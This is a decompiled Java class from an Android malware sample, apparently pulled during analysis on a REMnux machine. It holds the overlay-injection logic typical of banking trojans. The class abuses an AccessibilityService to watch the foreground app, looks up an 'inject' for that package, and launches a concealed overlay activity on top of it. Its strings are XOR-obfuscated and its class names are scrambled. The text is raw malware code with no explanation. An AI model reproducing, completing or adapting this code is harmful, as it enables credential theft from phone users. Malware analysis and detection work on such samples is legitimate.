package com.zjxyxnvvp.nxvxchltf.inject;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.util.e;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class a {
    private static short[] $ = {549, 557, 559, 568, 549, 570, 553, 630, 7463, 7448, 7437, 7430, 7425, 7430, 7439, 7496, 7425, 7430, 7426, 7437, 7435, 7452, 7496};

    /* renamed from: a */
    public static boolean f337a;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public boolean a() {
        return f337a;
    }

    public void b(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        long currentTimeMillis = System.currentTimeMillis();
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        if (accessibilityEvent.getPackageName() != null && accessibilityNodeInfo != null && accessibilityNodeInfo.getPackageName() != null && !f337a) {
            if (accessibilityEvent.getClassName().equals(uibwduIABuIaw.class.getName())) {
                f337a = true;
            } else {
                d(accessibilityNodeInfo, accessibilityService, currentTimeMillis);
            }
        }
    }

    public void c(boolean z) {
        f337a = z;
    }

    public void d(AccessibilityNodeInfo accessibilityNodeInfo, AccessibilityService accessibilityService, long j) {
        d dVar = d.e;
        String e = dVar.f314a.e(accessibilityService, accessibilityNodeInfo.getPackageName().toString());
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar = dVar.f314a;
        boolean g = aVar.g(accessibilityService, $(0, 8, 588) + accessibilityNodeInfo.getPackageName().toString());
        if (e != null && g) {
            f337a = true;
            uibwduIABuIaw.f338b = e;
            e.a($(8, 23, 7528) + ((Object) accessibilityNodeInfo.getPackageName()));
            uibwduIABuIaw.c = accessibilityNodeInfo.getPackageName().toString();
            accessibilityService.startActivity(new Intent(accessibilityService, uibwduIABuIaw.class).addFlags(268435456).addFlags(1073741824).addFlags(8388608));
        }
    }
}
